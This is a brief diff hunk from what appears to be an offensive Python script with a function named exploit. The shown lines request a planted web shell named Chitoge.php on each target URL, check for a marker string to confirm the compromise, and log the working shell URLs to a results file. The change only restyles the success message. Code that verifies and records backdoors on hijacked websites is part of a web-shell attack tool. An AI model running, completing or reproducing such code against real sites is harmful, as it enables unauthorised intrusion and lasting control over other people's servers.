@@ -121,7 +121,9 @@ def exploit(url):
                 y = curler.split("</html>")[1]
                 cekshell = requests.get(url + '/Chitoge.php?Chitoge', verify=False, timeout=8, headers=headers).text
                 if 'Chitoge kirisaki' in cekshell:
-                    text += " | Success"
+                    #text += " | Success"
+                    text += "\033[32;1m -> SUKSES GAN\033[0m"
+                    #text = '\033[32;1mTarget :\033[0m '
                     save = open('shell_results.txt','a')
                     save.write(url + '/Chitoge.php?Chitoge\n')
                     save.close()
